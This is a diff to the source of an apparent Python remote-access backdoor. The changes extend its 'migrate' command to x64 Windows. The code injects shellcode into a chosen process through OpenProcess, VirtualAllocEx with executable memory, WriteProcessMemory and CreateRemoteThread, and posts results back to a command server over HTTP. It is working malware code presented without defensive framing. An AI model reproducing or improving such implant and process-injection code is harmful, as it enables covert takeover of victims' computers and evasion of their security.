@@ -2,7 +2,7 @@
 # -*- coding: utf-8 -*-
 
 __author__      = 'Christophoros Petrou (game0ver)'
-__version__     = '1.3'
+__version__     = '1.4'
 
 import os
 import re
@@ -152,7 +152,8 @@ def migrate_res(pid, retcode):
 
 def migrate_to_pid(pid):
     """
-    this function is inspired & adapted from the "GRAY HAT PYTHON" book.
+    This function is inspired & adapted from the "GRAY HAT PYTHON" book.
+    However it's modified to work also for x64 Windows systems.
     """
     try:
         h_process  = kernel32.OpenProcess( PROCESS_ALL_ACCESS, False, int(pid) )
@@ -160,7 +161,10 @@ def migrate_to_pid(pid):
             return 2
         arg_address = kernel32.VirtualAllocEx(h_process, 0, len(shellcode), VIRTUAL_MEM, PAGE_EXECUTE_READWRITE)
         kernel32.WriteProcessMemory(h_process, arg_address, shellcode, len(shellcode), byref(c_int(0)))
-        return 3 if not kernel32.CreateRemoteThread(h_process, None, 0, arg_address, None, 0, byref(c_ulong(0))) else 1
+        if is_os_64bit():
+            return 3 if not kernel32.CreateRemoteThread(h_process, None, 0, arg_address, None, 0, byref(c_int64(0))) else 1
+        else:
+            return 3 if not kernel32.CreateRemoteThread(h_process, None, 0, arg_address, None, 0, byref(c_ulong(0))) else 1
     except Exception as error:
         return 3
 
@@ -332,16 +336,15 @@ try:
                                 )
                     elif migrate.match(cmd):
                         if os.name == 'nt':
-                            if not is_os_64bit():
-                                if shellcode:
-                                    pid = migrate.search(cmd).group(1)
-                                    res = migrate_to_pid(pid)
-                                    s.post(SERVER, data=migrate_res(pid, res))
-                                else:
-                                    s.post(SERVER, data='No shellcode specified...')
+                            if shellcode:
+                                pid = migrate.search(cmd).group(1)
+                                res = migrate_to_pid(pid)
+                                s.post(SERVER, data=migrate_res(pid, res))
+                            else:
+                                s.post(SERVER, data='No shellcode specified...')
                         else:
                             s.post(SERVER,
-                                data='For now "migrate" command is available only for 32bit-windows systems.'
+                                data='For now "migrate" command is available only for x86 & x64 windows systems.'
                             )
                     else:
                         try:
